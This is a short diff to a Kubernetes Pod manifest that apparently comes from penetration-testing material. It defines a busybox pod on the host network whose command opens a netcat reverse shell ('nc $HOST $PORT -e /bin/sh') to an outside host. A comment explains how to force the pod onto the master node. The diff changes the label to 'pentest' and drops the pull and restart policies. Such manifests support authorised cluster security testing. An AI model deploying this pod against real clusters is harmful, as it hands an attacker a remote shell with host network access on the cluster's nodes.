@@ -8,15 +8,13 @@ kind: Pod
 metadata:
   name: pod-hostnetwork-revshell
   labels:
-    app: hostnetwork-revshell
+    app: pentest
 spec:
   hostNetwork: true
   containers:
   - image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    imagePullPolicy: IfNotPresent
     name: hostnetwork-revshell
   # Force scheduling of your pod on master mode by uncommenting this line and changing the name
   #nodeName: k8s-master
-  restartPolicy: Always
